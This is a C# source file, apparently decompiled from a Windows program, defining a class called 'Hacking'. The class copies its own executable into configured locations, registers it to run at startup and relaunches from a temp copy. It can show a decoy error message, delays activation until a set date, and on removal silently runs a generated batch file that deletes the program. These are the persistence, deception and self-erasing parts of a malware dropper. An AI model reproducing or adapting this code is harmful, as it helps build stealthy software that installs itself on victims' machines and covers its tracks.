using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Main.Properties;

namespace Main.Tools
{
	internal static class Hacking
	{
		internal static void InitSoftware(Config.StartModeType startMode, string arg)
		{
			if (startMode == Config.StartModeType.Debug)
			{
				MessageBox.Show(Resources.StartModeDebug);
				return;
			}
			if (arg != null)
			{
				if (startMode == Config.StartModeType.DeleteItself)
				{
					arg = arg.Replace("?", " ");
					if (Path.IsPathRooted(arg) && File.Exists(arg))
					{
						int num = 0;
						bool flag;
						do
						{
							string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(arg);
							string exeFolderPath = Directory.GetParent(arg).ToString();
							flag = Process.GetProcessesByName(fileNameWithoutExtension).FirstOrDefault((Process p) => p.MainModule.FileName.StartsWith(exeFolderPath)) != null;
							Thread.Sleep(100);
							num++;
						}
						while (flag && num < 100);
						Thread.Sleep(300);
						if (!flag)
						{
							File.Delete(arg);
						}
					}
				}
				if (startMode == Config.StartModeType.ErrorMessage)
				{
					MessageBox.Show(Config.ErrorMessage, Config.ErrorTitle, MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				if (Config.OnlyRunAfterSysRestart)
				{
					Environment.Exit(0);
				}
				return;
			}
			string tempExePath = Config.TempExePath;
			if (Config.FinalExeRelativePath != null)
			{
				string b = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileName(Config.FinalExeRelativePath));
				Windows.SetStartup(Config.StartupMethod);
				if (Application.ExecutablePath == Config.FinalExePath || Application.ExecutablePath == b)
				{
					return;
				}
			}
			if (ExeSmartCopy(Config.FinalExePath, overwrite: true))
			{
				ExeSmartCopy(tempExePath, overwrite: true);
			}
			string arguments = Application.ExecutablePath.Replace(" ", "?");
			Process.Start(tempExePath, arguments);
			Environment.Exit(0);
		}

		internal static bool ExeSmartCopy(string targetExePath, bool overwrite)
		{
			if (Application.ExecutablePath == targetExePath)
			{
				return false;
			}
			Directory.CreateDirectory(Directory.GetParent(targetExePath).ToString());
			File.Copy(Application.ExecutablePath, targetExePath, overwrite);
			return true;
		}

		internal static bool ShouldActivate()
		{
			return DateTime.Now > Config.ActiveAfterDateTime;
		}

		internal static void RemoveItself()
		{
			if (Config.StartMode == Config.StartModeType.Debug)
			{
				Environment.Exit(0);
			}
			try
			{
				Windows.RemoveStartupRegistry(Config.FinalExePath);
				foreach (string item in new HashSet<string>
				{
					Path.GetDirectoryName(Config.FinalExePath),
					Path.GetDirectoryName(Config.TempExePath),
					Config.WorkFolderPath
				})
				{
					try
					{
						if (Directory.Exists(item))
						{
							Directory.Delete(item, recursive: true);
						}
					}
					catch (Exception)
					{
					}
				}
				string text = Path.GetDirectoryName(Application.ExecutablePath) + "\\DeleteItself.bat";
				using (StreamWriter streamWriter = new StreamWriter(text, append: false, Encoding.Default))
				{
					streamWriter.Write(":del\r\n del \"{0}\"\r\nif exist \"{0}\" goto del\r\ndel %0\r\n", Application.ExecutablePath);
				}
				WinExec(text, 0u);
			}
			finally
			{
				Environment.Exit(0);
			}
		}

		[DllImport("kernel32.dll")]
		public static extern uint WinExec(string lpCmdLine, uint uCmdShow);
	}
}
